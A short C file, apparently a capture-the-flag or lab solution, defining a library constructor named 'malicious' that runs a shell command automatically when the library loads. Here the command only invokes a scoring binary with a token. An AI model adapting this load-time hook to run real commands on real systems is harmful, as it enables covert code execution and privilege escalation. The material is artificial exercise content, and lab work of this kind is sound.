#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score c8ebe141-5ec7-4bc8-a663-14d4d1118262");
}